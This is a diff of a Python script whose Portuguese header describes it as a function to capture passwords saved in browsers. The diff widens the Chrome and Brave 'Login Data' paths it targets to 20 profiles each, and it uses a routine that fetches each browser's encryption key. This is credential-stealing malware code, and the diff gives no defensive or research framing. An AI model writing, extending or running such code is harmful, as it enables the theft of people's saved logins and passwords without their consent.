@@ -1,3 +1,6 @@
+# Função para capturar as senhas salvas de navegadores
+# Início: 01/05/2025 | Última atualização: 01/05/2025
+
 import os
 import json
 import base64
@@ -134,7 +137,18 @@ def get_chrome_passwords():
         "Profile 7": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Profile 7", "Login Data"),
         "Profile 8": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Profile 8", "Login Data"),
         "Profile 9": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Profile 9", "Login Data"),
-        "Profile 10": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Profile 10", "Login Data")
+        "Profile 10": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Profile 10", "Login Data"),
+        "Profile 11": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Profile 11", "Login Data"),
+        "Profile 12": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Profile 12", "Login Data"),
+        "Profile 13": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Profile 13", "Login Data"),
+        "Profile 14": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Profile 14", "Login Data"),
+        "Profile 15": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Profile 15", "Login Data"),
+        "Profile 16": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Profile 16", "Login Data"),
+        "Profile 17": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Profile 17", "Login Data"),
+        "Profile 18": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Profile 18", "Login Data"),
+        "Profile 19": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Profile 19", "Login Data"),
+        "Profile 20": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Profile 20", "Login Data"),
+        
     }
     
     key = get_encryption_key("Google\\Chrome")
@@ -150,7 +164,25 @@ def get_brave_passwords():
     browser_paths = {
         "Default": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data"),
         "Profile 1": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Profile 1", "Login Data"),
-        "Profile 2": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Profile 2", "Login Data")
+        "Profile 2": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Profile 2", "Login Data"),
+        "Profile 3": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Profile 3", "Login Data"),
+        "Profile 4": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Profile 4", "Login Data"),
+        "Profile 5": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Profile 5", "Login Data"),
+        "Profile 6": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Profile 6", "Login Data"),
+        "Profile 7": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Profile 7", "Login Data"),
+        "Profile 8": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Profile 8", "Login Data"),
+        "Profile 9": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Profile 9", "Login Data"),
+        "Profile 10": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Profile 10", "Login Data"),
+        "Profile 11": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Profile 11", "Login Data"),
+        "Profile 12": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Profile 12", "Login Data"),
+        "Profile 13": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Profile 13", "Login Data"),
+        "Profile 14": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Profile 14", "Login Data"),
+        "Profile 15": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Profile 15", "Login Data"),
+        "Profile 16": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Profile 16", "Login Data"),
+        "Profile 17": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Profile 17", "Login Data"),
+        "Profile 18": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Profile 18", "Login Data"),
+        "Profile 19": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Profile 19", "Login Data"),
+        "Profile 20": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Profile 20", "Login Data"),
     }
     
     key = get_encryption_key("BraveSoftware\\Brave-Browser")
